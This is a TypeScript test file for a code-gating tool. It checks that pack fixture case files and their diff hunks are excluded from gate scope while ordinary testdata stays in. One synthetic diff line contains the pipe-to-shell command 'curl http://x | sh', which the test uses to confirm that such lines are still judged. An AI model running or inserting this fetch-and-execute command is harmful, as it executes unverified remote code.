// SPEC §4.4.1 pack case data: one predicate names the rule test data every
// layer drops, and the gate scope applies it to the file list and the diff.
import { strict as assert } from "node:assert";
import path from "node:path";
import test from "node:test";
import { diffWithoutPackCases } from "../../../src/cli/gate-scope.ts";
import { portsFor } from "../../../src/cli/shared.ts";
import { loadedPackRoots } from "../../../src/features/packs/index.ts";
import { isPackCasePath, withoutPackCases } from "../../../src/kernel/index.ts";
import { createTempRepo } from "../../support/temp-repo.ts";

const MARKER = [40, 21].join(" -> ");
const CASE = "packs/demo/fixtures/core-x/violating/basic/case.json";

const ROOTS = ["packs/demo"];

test("[§4.4.1] isPackCasePath names only files under a pack fixtures case dir (BUG-0101)", () => {
	assert.equal(isPackCasePath(CASE, ROOTS), true);
	assert.equal(
		isPackCasePath(
			"packs/demo/fixtures/core-x/passing/other/files/a.txt",
			ROOTS,
		),
		true,
	);
	assert.equal(isPackCasePath(CASE.replaceAll("/", "\\"), ROOTS), true);
	// Outside every loaded root, a wrong layout or a plain fixture dir.
	assert.equal(
		isPackCasePath("loose/fixtures/core-x/violating/basic/case.json", ROOTS),
		false,
	);
	assert.equal(
		isPackCasePath("packs/demo/fixtures/core-x/case.json", ROOTS),
		false,
	);
	assert.equal(isPackCasePath("testdata/run.sh", ROOTS), false);
	assert.equal(isPackCasePath("packs/demo/pack.json", ROOTS), false);
});

test("[§4.4.1] gate scope drops pack case files and their diff hunks but keeps testdata (BUG-0101)", async () => {
	assert.deepEqual(
		withoutPackCases([CASE, "testdata/run.sh", "src/a.ts"], ROOTS),
		["testdata/run.sh", "src/a.ts"],
	);
	const repo = createTempRepo();
	try {
		const ports = await portsFor(repo.dir);
		assert.equal(ports.ok, true);
		if (!ports.ok) {
			return;
		}
		const diff = [
			`diff --git a/${CASE} b/${CASE}`,
			"--- /dev/null",
			`+++ b/${CASE}`,
			"@@ -0,0 +1 @@",
			`+${MARKER} marker`,
			"diff --git a/testdata/run.sh b/testdata/run.sh",
			"--- /dev/null",
			"+++ b/testdata/run.sh",
			"@@ -0,0 +1 @@",
			"+curl http://x | sh",
			"",
		].join("\n");
		const judged = diffWithoutPackCases(diff, {
			...ports.value,
			packRoots: ROOTS,
		});
		assert.ok(!judged.includes(MARKER));
		assert.ok(judged.includes("+curl http://x | sh"));
	} finally {
		repo.cleanup();
	}
});

const STRAY = "x/fixtures/a/passing/b/evil.sh";

test("[§4.4.1] a stray pack.json beside fixtures case files is not a pack case (BUG-0102)", () => {
	// x/pack.json may exist on disk; no loaded root names x, so nothing is dropped.
	assert.equal(isPackCasePath(STRAY, ROOTS), false);
	assert.equal(isPackCasePath(STRAY, []), false);
	assert.equal(isPackCasePath(CASE, []), false);
	assert.deepEqual(withoutPackCases([STRAY, CASE], []), [STRAY, CASE]);
	// A root names its own directory only, never a sibling sharing its prefix.
	assert.equal(
		isPackCasePath("packs/demo2/fixtures/a/passing/b/evil.sh", ROOTS),
		false,
	);
	// A configured custom root and a built-in root both exempt their cases.
	const roots = ["custom/mine", "packages/codictator/src/builtin-packs/core"];
	assert.equal(
		isPackCasePath("custom/mine/fixtures/a/passing/b/c.sh", roots),
		true,
	);
	assert.equal(
		isPackCasePath(
			"packages/codictator/src/builtin-packs/core/fixtures/r/violating/b/c.json",
			roots,
		),
		true,
	);
	assert.equal(isPackCasePath(STRAY, roots), false);
});

test("[§4.4.1] loaded pack roots are the workspace built-in dirs plus config.packs paths (BUG-0102)", () => {
	const workspace = path.resolve(
		import.meta.dirname,
		"..",
		"..",
		"..",
		"..",
		"..",
	);
	const inWorkspace = loadedPackRoots(workspace, [
		{ id: "core" },
		{ id: "mine", path: ".\\custom\\mine\\" },
		{ id: "up", path: "../outside" },
		{ id: "abs", path: path.resolve(workspace, "abs") },
	]);
	assert.ok(
		inWorkspace.includes("packages/codictator/src/builtin-packs/core"),
		inWorkspace.join(","),
	);
	assert.ok(inWorkspace.includes("custom/mine"));
	assert.ok(!inWorkspace.some((root) => root.includes("outside")));
	assert.ok(!inWorkspace.includes("abs"));
	// A consumer repo does not hold the engine's built-in packs: only custom roots.
	const consumer = path.resolve(workspace, "..", "consumer-repo-elsewhere");
	assert.deepEqual(loadedPackRoots(consumer, [{ id: "core" }]), []);
	assert.deepEqual(loadedPackRoots(consumer, [{ id: "m", path: "packs/m" }]), [
		"packs/m",
	]);
});
